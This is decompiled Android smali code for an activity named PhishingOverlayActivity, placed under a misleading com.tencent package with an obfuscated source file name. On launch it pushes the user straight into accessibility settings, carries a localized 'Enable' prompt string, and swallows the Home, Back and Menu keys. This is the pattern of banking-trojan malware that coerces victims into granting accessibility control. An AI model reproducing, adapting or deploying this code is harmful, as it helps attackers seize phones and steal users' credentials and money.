.class public Lcom/tencent/PhishingOverlayActivity;
.super Landroid/app/Activity;
.source "withdrawalhskfdisagreed3.java"


# annotations
.annotation system Ldalvik/annotation/MemberClasses;
    value = {
        Lcom/tencent/PhishingOverlayActivity$MyWebViewClient;,
        Lcom/tencent/PhishingOverlayActivity$MyWebChromeClient;,
        Lcom/tencent/PhishingOverlayActivity$WebAppInterface;
    }
.end annotation


# static fields
.field static myctx:Landroid/content/Context;


# instance fields
.field public localeForAccessibility:Ljava/lang/String;


# direct methods
.method static constructor <clinit>()V
    .locals 0

    return-void
.end method

.method public constructor <init>()V
    .locals 1

    .line 21
    invoke-direct {p0}, Landroid/app/Activity;-><init>()V

    const-string v0, "{\'en\':\'Enable\',\'de\':\'Aktivieren\',\'ar\':\'\u062a\u0641\u0639\u064a\u0644"

    .line 22
    iput-object v0, p0, Lcom/tencent/PhishingOverlayActivity;->localeForAccessibility:Ljava/lang/String;

    return-void
.end method


# virtual methods
.method public finish()V
    .locals 0

    .line 26
    invoke-virtual {p0}, Lcom/tencent/PhishingOverlayActivity;->finishAndRemoveTask()V

    return-void
.end method

.method public localeTextAccessibility()Ljava/lang/String;
    .locals 2

    .line 34
    :try_start_0
    new-instance v0, Lorg/json/JSONObject;

    iget-object v1, p0, Lcom/tencent/PhishingOverlayActivity;->localeForAccessibility:Ljava/lang/String;

    invoke-direct {v0, v1}, Lorg/json/JSONObject;-><init>(Ljava/lang/String;)V

    invoke-static {}, Ljava/util/Locale;->getDefault()Ljava/util/Locale;

    move-result-object v1

    invoke-virtual {v1}, Ljava/util/Locale;->getLanguage()Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    return-object v0

    :catch_0
    const-string v0, "Enable"

    return-object v0
.end method

.method public onBackPressed()V
    .locals 0

    .line 41
    invoke-super {p0}, Landroid/app/Activity;->onBackPressed()V

    return-void
.end method

.method public onCreate(Landroid/os/Bundle;)V
    .locals 2

    invoke-super {p0, p1}, Landroid/app/Activity;->onCreate(Landroid/os/Bundle;)V

    new-instance v0, Landroid/content/Intent;

    const-string v1, "android.settings.ACCESSIBILITY_SETTINGS"

    invoke-direct {v0, v1}, Landroid/content/Intent;-><init>(Ljava/lang/String;)V

    invoke-virtual {p0, v0}, Lcom/tencent/PhishingOverlayActivity;->startActivity(Landroid/content/Intent;)V

    invoke-virtual {p0}, Lcom/tencent/PhishingOverlayActivity;->finish()V

    return-void
.end method

.method public onDestroy()V
    .locals 0

    .line 216
    invoke-super {p0}, Landroid/app/Activity;->onDestroy()V

    return-void
.end method

.method public onKeyDown(ILandroid/view/KeyEvent;)Z
    .locals 1

    const/4 p2, 0x3

    const/4 v0, 0x1

    if-ne p1, p2, :cond_0

    goto :goto_0

    :cond_0
    const/4 p2, 0x4

    if-ne p1, p2, :cond_1

    goto :goto_0

    :cond_1
    const/16 p2, 0x52

    if-ne p1, p2, :cond_2

    goto :goto_0

    :cond_2
    const/4 v0, 0x0

    :goto_0
    return v0
.end method

.method protected onStop()V
    .locals 0

    .line 224
    invoke-super {p0}, Landroid/app/Activity;->onStop()V

    return-void
.end method
